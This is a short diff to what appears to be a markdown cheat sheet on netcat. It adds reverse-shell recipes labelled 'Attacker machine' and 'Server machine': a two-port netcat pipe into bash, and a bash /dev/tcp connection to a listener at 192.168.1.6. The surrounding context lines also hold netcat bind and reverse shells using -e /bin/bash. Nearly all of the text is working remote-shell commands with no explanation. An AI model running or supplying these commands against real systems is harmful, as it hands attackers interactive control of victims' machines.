@@ -149,4 +149,15 @@ nc -lp 8080 -e /bin/bash
 nc -lp 8080
 # Server machine
 nc 192.168.1.3 -e /bin/bash
+
+# Attacker machine
+nc -lp 1000
+nc -lp 1001
+# Server machine
+nc 192.168.1.3 1000 | bash 2>&1 | nc 192.168.1.3 1001
+
+# Attacker machine
+nc -lp 8080
+# Server machine
+bash -i > /dev/tcp/192.168.1.6/8080 0>&1 2>&1
 ```
